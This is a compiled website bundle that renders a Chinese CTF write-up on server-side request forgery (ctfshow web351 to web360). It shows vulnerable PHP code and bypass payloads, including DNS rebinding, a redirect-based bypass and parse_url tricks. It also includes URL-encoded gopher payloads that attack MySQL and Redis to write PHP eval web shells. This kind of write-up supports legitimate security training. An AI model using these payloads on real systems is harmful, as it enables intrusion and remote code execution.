"use strict";(self.webpackChunkremote_website=self.webpackChunkremote_website||[]).push([[7198],{27639:(e,r,n)=>{n.r(r),n.d(r,{assets:()=>p,contentTitle:()=>i,default:()=>o,frontMatter:()=>h,metadata:()=>l,toc:()=>t});const l=JSON.parse('{"id":"CTF/CTFSHOW/ctfshow-ssrf","title":"ctfshow-ssrf","description":"web351","source":"@site/docs/CTF/CTFSHOW/ctfshow-ssrf.md","sourceDirName":"CTF/CTFSHOW","slug":"/CTF/CTFSHOW/ctfshow-ssrf","permalink":"/docs/CTF/CTFSHOW/ctfshow-ssrf","draft":false,"unlisted":false,"editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/docs/CTF/CTFSHOW/ctfshow-ssrf.md","tags":[],"version":"current","frontMatter":{},"sidebar":"CTFSidebar","previous":{"title":"ctfshow-sql\u6ce8\u5165","permalink":"/docs/CTF/CTFSHOW/ctfshow-sql\u6ce8\u5165"},"next":{"title":"ctfshow-ssti","permalink":"/docs/CTF/CTFSHOW/ctfshow-ssti"}}');var c=n(74848),s=n(28453);const h={},i=void 0,p={},t=[{value:"web351",id:"web351",level:2},{value:"web352",id:"web352",level:2},{value:"web353(\u6574\u5f62ip)",id:"web353\u6574\u5f62ip",level:2},{value:"web354(\u57df\u540dDNS\u91cd\u5b9a\u5411)",id:"web354\u57df\u540ddns\u91cd\u5b9a\u5411",level:2},{value:"web355(0\u4ee3\u8868\u672c\u5730ip)",id:"web3550\u4ee3\u8868\u672c\u5730ip",level:2},{value:"web356(0\u4ee3\u8868\u672c\u5730ip)",id:"web3560\u4ee3\u8868\u672c\u5730ip",level:2},{value:"web357(DNS\u91cd\u65b0\u7ed1\u5b9a,302\u8df3\u8f6c)",id:"web357dns\u91cd\u65b0\u7ed1\u5b9a302\u8df3\u8f6c",level:2},{value:"web358(parse_url\u5229\u7528)",id:"web358parse_url\u5229\u7528",level:2},{value:"web359(gopher\u6253\u65e0\u5bc6\u7801mysql)",id:"web359gopher\u6253\u65e0\u5bc6\u7801mysql",level:2},{value:"web360(\u6253redis)",id:"web360\u6253redis",level:2}];function d(e){const r={blockquote:"blockquote",code:"code",h2:"h2",img:"img",p:"p",pre:"pre",...(0,s.R)(),...e.components};return(0,c.jsxs)(c.Fragment,{children:[(0,c.jsx)(r.h2,{id:"web351",children:"web351"}),"\n",(0,c.jsx)(r.pre,{children:(0,c.jsx)(r.code,{className:"language-php",children:"<?php\r\nerror_reporting(0);\r\nhighlight_file(__FILE__);\r\n$url=$_POST['url'];\r\n$ch=curl_init($url);\r\ncurl_setopt($ch, CURLOPT_HEADER, 0);\r\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\r\n$result=curl_exec($ch);\r\ncurl_close($ch);\r\necho ($result);\r\n?>\n"})}),"\n",(0,c.jsx)(r.p,{children:"payload"}),"\n",(0,c.jsx)(r.pre,{children:(0,c.jsx)(r.code,{children:"127.0.0.1/flag.php\r\nlocalhost/flag.php\r\nfile:///var/www/html/flag.php\n"})}),"\n",(0,c.jsx)(r.h2,{id:"web352",children:"web352"}),"\n",(0,c.jsx)(r.pre,{children:(0,c.jsx)(r.code,{className:"language-php",children:"<?php\r\nerror_reporting(0);\r\nhighlight_file(__FILE__);\r\n$url=$_POST['url'];\r\n$x=parse_url($url);\r\nif($x['scheme']==='http'||$x['scheme']==='https'){\r\nif(!preg_match('/localhost|127.0.0/')){\r\n$ch=curl_init($url);\r\ncurl_setopt($ch, CURLOPT_HEADER, 0);\r\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\r\n$result=curl_exec($ch);\r\ncurl_close($ch);\r\necho ($result);\r\n}\r\nelse{\r\n    die('hacker');\r\n}\r\n}\r\nelse{\r\n    die('hacker'); \r\n}\n"})}),"\n",(0,c.jsx)(r.p,{children:"\u5fc5\u987bhttp\u5f00\u5934\u5c31\u884c\u4e86"}),"\n",(0,c.jsx)(r.p,{children:"payload"}),"\n",(0,c.jsx)(r.pre,{children:(0,c.jsx)(r.code,{children:"http://localhost/flag.php\r\nhttp://127.0.0.1/flag.php\r\nhttp://2130706433/flag.php\n"})}),"\n",(0,c.jsx)(r.h2,{id:"web353\u6574\u5f62ip",children:"web353(\u6574\u5f62ip)"}),"\n",(0,c.jsx)(r.pre,{children:(0,c.jsx)(r.code,{className:"language-php",children:" <?php\r\nerror_reporting(0);\r\nhighlight_file(__FILE__);\r\n$url=$_POST['url'];\r\n$x=parse_url($url);\r\nif($x['scheme']==='http'||$x['scheme']==='https'){\r\nif(!preg_match('/localhost|127\\.0\\.|\\\u3002/i', $url)){\r\n$ch=curl_init($url);\r\ncurl_setopt($ch, CURLOPT_HEADER, 0);\r\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\r\n$result=curl_exec($ch);\r\ncurl_close($ch);\r\necho ($result);\r\n}\r\nelse{\r\n    die('hacker');\r\n}\r\n}\r\nelse{\r\n    die('hacker');\r\n}\r\n?> \n"})}),"\n",(0,c.jsx)(r.p,{children:"payload"}),"\n",(0,c.jsx)(r.pre,{children:(0,c.jsx)(r.code,{children:"\u4f7f\u7528sudo.cc\u4ee3\u66ff127.0.0.1/localhost url=http://sudo.cc/flag.php\r\n\u5728Linux\u4e2d0\u8868\u793a\u81ea\u8eab\u7684\u5730\u5740 \u53ef\u4ee5\u4f7f\u7528http://0/flag.php \u7ed5\u8fc7\r\nhttp://2130706433/flag.php\n"})}),"\n",(0,c.jsx)(r.h2,{id:"web354\u57df\u540ddns\u91cd\u5b9a\u5411",children:"web354(\u57df\u540dDNS\u91cd\u5b9a\u5411)"}),"\n",(0,c.jsx)(r.pre,{children:(0,c.jsx)(r.code,{className:"language-php",children:" <?php\r\nerror_reporting(0);\r\nhighlight_file(__FILE__);\r\n$url=$_POST['url'];\r\n$x=parse_url($url);\r\nif($x['scheme']==='http'||$x['scheme']==='https'){\r\nif(!preg_match('/localhost|1|0|\u3002/i', $url)){\r\n$ch=curl_init($url);\r\ncurl_setopt($ch, CURLOPT_HEADER, 0);\r\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\r\n$result=curl_exec($ch);\r\ncurl_close($ch);\r\necho ($result);\r\n}\r\nelse{\r\n    die('hacker');\r\n}\r\n}\r\nelse{\r\n    die('hacker');\r\n}\r\n?> \n"})}),"\n",(0,c.jsx)(r.p,{children:"payload"}),"\n",(0,c.jsx)(r.pre,{children:(0,c.jsx)(r.code,{children:"http://da.xyz52.link/flag.php\r\n\u8bbe\u7f6eA\u8bb0\u5f55\u6307\u5411127.0.0.1\n"})}),"\n",(0,c.jsx)(r.h2,{id:"web3550\u4ee3\u8868\u672c\u5730ip",children:"web355(0\u4ee3\u8868\u672c\u5730ip)"}),"\n",(0,c.jsx)(r.pre,{children:(0,c.jsx)(r.code,{className:"language-php",children:" <?php\r\nerror_reporting(0);\r\nhighlight_file(__FILE__);\r\n$url=$_POST['url'];\r\n$x=parse_url($url);\r\nif($x['scheme']==='http'||$x['scheme']==='https'){\r\n$host=$x['host'];\r\nif((strlen($host)<=5)){\r\n$ch=curl_init($url);\r\ncurl_setopt($ch, CURLOPT_HEADER, 0);\r\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\r\n$result=curl_exec($ch);\r\ncurl_close($ch);\r\necho ($result);\r\n}\r\nelse{\r\n    die('hacker');\r\n}\r\n}\r\nelse{\r\n    die('hacker');\r\n}\r\n?> \n"})}),"\n",(0,c.jsx)(r.p,{children:"payload"}),"\n",(0,c.jsx)(r.pre,{children:(0,c.jsx)(r.code,{children:"url=http://127.1/flag.php\r\nurl=http://0/flag.php\n"})}),"\n",(0,c.jsx)(r.h2,{id:"web3560\u4ee3\u8868\u672c\u5730ip",children:"web356(0\u4ee3\u8868\u672c\u5730ip)"}),"\n",(0,c.jsx)(r.p,{children:"host\u540d\u79f0\u7684\u957f\u5ea6\u5c0f\u4e8e3"}),"\n",(0,c.jsx)(r.p,{children:"payload"}),"\n",(0,c.jsx)(r.pre,{children:(0,c.jsx)(r.code,{children:"url=http://0/flag.php\n"})}),"\n",(0,c.jsx)(r.h2,{id:"web357dns\u91cd\u65b0\u7ed1\u5b9a302\u8df3\u8f6c",children:"web357(DNS\u91cd\u65b0\u7ed1\u5b9a,302\u8df3\u8f6c)"}),"\n",(0,c.jsx)(r.pre,{children:(0,c.jsx)(r.code,{className:"language-php",children:" <?php\r\nerror_reporting(0);\r\nhighlight_file(__FILE__);\r\n$url=$_POST['url'];\r\n$x=parse_url($url);\r\nif($x['scheme']==='http'||$x['scheme']==='https'){\r\n$ip = gethostbyname($x['host']);\r\necho '</br>'.$ip.'</br>';\r\nif(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {\r\n    die('ip!');\r\n}\r\n\r\n\r\necho file_get_contents($_POST['url']);\r\n}\r\nelse{\r\n    die('scheme');\r\n}\r\n?> \n"})}),"\n",(0,c.jsxs)(r.blockquote,{children:["\n",(0,c.jsx)(r.p,{children:"filter_var \u2014 \u4f7f\u7528\u7279\u5b9a\u7684\u8fc7\u6ee4\u5668\u8fc7\u6ee4\u4e00\u4e2a\u53d8\u91cf"}),"\n",(0,c.jsx)(r.p,{children:"\u9a8c\u8bc1ip\u662f\u5426\u662f\u5185\u7f51ip\uff0c\u5982\u679c\u662f\u7684\u8bdd\u8fd4\u56defalse\uff0c\u5426\u5219\u8fd4\u56deip\uff1b"}),"\n",(0,c.jsx)(r.p,{children:"\u4ee3\u7801\u5982\u4e0b\uff1a"}),"\n",(0,c.jsx)(r.p,{children:"filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)"}),"\n",(0,c.jsx)(r.p,{children:"gethostbyname \u2014 \u8fd4\u56de\u4e3b\u673a\u540d\u5bf9\u5e94\u7684 IPv4\u5730\u5740."}),"\n",(0,c.jsx)(r.pre,{children:(0,c.jsx)(r.code,{className:"language-php",children:"<?php\r\n$ip = gethostbyname('www.baidu.com');\r\necho $ip;\n"})}),"\n"]}),"\n",(0,c.jsx)(r.p,{children:"payload"}),"\n",(0,c.jsx)(r.p,{children:"\u5728\u81ea\u5df1\u670d\u52a1\u5668\u4e0a\u5199"}),"\n",(0,c.jsx)(r.pre,{children:(0,c.jsx)(r.code,{className:"language-php",children:'<?php\r\nheader("Location:http://127.0.0.1/flag.php"); \n'})}),"\n",(0,c.jsx)(r.p,{children:"\u8bbf\u95ee\u6587\u4ef6"}),"\n",(0,c.jsxs)(r.p,{children:["\u8bbf\u95ee",(0,c.jsx)(r.code,{children:"http://ceye.io"})]}),"\n",(0,c.jsx)(r.p,{children:(0,c.jsx)(r.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240206212348241.png",alt:"image-20240206212348241"})}),"\n",(0,c.jsx)(r.pre,{children:(0,c.jsx)(r.code,{children:"url=http://r.5k7kuy.ceye.io/flag.php\n"})}),"\n",(0,c.jsx)(r.h2,{id:"web358parse_url\u5229\u7528",children:"web358(parse_url\u5229\u7528)"}),"\n",(0,c.jsx)(r.pre,{children:(0,c.jsx)(r.code,{className:"language-php",children:" <?php\r\nerror_reporting(0);\r\nhighlight_file(__FILE__);\r\n$url=$_POST['url'];\r\n$x=parse_url($url);\r\nif(preg_match('/^http:\\/\\/ctf\\..*show$/i',$url)){\r\n    echo file_get_contents($url);\r\n}\n"})}),"\n",(0,c.jsxs)(r.p,{children:["\u8981\u6c42",(0,c.jsx)(r.code,{children:"http://ctf."}),"\u5f00\u5934\uff0cshow\u7ed3\u5c3e"]}),"\n",(0,c.jsx)(r.p,{children:"payload"}),"\n",(0,c.jsx)(r.pre,{children:(0,c.jsx)(r.code,{children:"http://ctf.@127.0.0.1/flag.php?show\n"})}),"\n",(0,c.jsx)(r.h2,{id:"web359gopher\u6253\u65e0\u5bc6\u7801mysql",children:"web359(gopher\u6253\u65e0\u5bc6\u7801mysql)"}),"\n",(0,c.jsx)(r.p,{children:"check.php\u5173\u952e\u4ee3\u7801"}),"\n",(0,c.jsx)(r.pre,{children:(0,c.jsx)(r.code,{className:"language-php",children:"if(isset($_POST['returl'])){\r\n        $url = $_POST['returl'];\r\n    if(preg_match(\"/file|dict/i\",$url)){\r\n        die();\r\n    }\r\n            echo _request(\"$url\");\r\n\r\n}\n"})}),"\n",(0,c.jsx)(r.p,{children:"\u6211\u4eec\u53ef\u4ee5\u60f3\u5230\u6570\u636e\u5e93 \u90a3\u6211\u4eec\u76f4\u63a5\u901a\u8fc7 gopher \u653b\u51fbmysql\u5373\u53ef"}),"\n",(0,c.jsx)(r.p,{children:"python2 gopherus.py --exploit mysql"}),"\n",(0,c.jsx)(r.p,{children:"\u5229\u7528\u5de5\u5177\u751f\u6210payload"}),"\n",(0,c.jsx)(r.p,{children:(0,c.jsx)(r.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240207193533482.png",alt:"image-20240207193533482"})}),"\n",(0,c.jsx)(r.p,{children:"\u7136\u540e\u5c06\u4e0b\u5212\u7ebf\u540e\u9762\u7684\u5728\u8fdb\u884curl\u7f16\u7801\u751f\u6210\u6700\u7ec8payload"}),"\n",(0,c.jsx)(r.pre,{children:(0,c.jsx)(r.code,{children:"gopher://127.0.0.1:3306/_%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%2545%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%2522%253c%253f%2570%2568%2570%2520%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2531%255d%2529%253b%253f%253e%2522%2520%2569%256e%2574%256f%2520%256f%2575%2574%2566%2569%256c%2565%2520%2527%252f%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%252f%2531%252e%2570%2568%2570%2527%2501%2500%2500%2500%2501\n"})}),"\n",(0,c.jsx)(r.h2,{id:"web360\u6253redis",children:"web360(\u6253redis)"}),"\n",(0,c.jsx)(r.p,{children:"\u540c\u6837\u751f\u6210payload\uff0c\u548c\u4e0a\u4e00\u9898\u4e00\u6837"}),"\n",(0,c.jsx)(r.p,{children:(0,c.jsx)(r.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240207195040902.png",alt:"image-20240207195040902"})}),"\n",(0,c.jsx)(r.pre,{children:(0,c.jsx)(r.code,{children:"gopher://127.0.0.1:6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252428%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_POST%255B1%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A\n"})}),"\n",(0,c.jsx)(r.p,{children:"\u9ed8\u8ba4\u662fshell.php\u6587\u4ef6"})]})}function o(e={}){const{wrapper:r}={...(0,s.R)(),...e.components};return r?(0,c.jsx)(r,{...e,children:(0,c.jsx)(d,{...e})}):d(e)}},28453:(e,r,n)=>{n.d(r,{R:()=>h,x:()=>i});var l=n(96540);const c={},s=l.createContext(c);function h(e){const r=l.useContext(s);return l.useMemo((function(){return"function"==typeof e?e(r):{...r,...e}}),[r,e])}function i(e){let r;return r=e.disableParentContext?"function"==typeof e.components?e.components(c):e.components||c:h(e.components),l.createElement(s.Provider,{value:r},e.children)}}}]);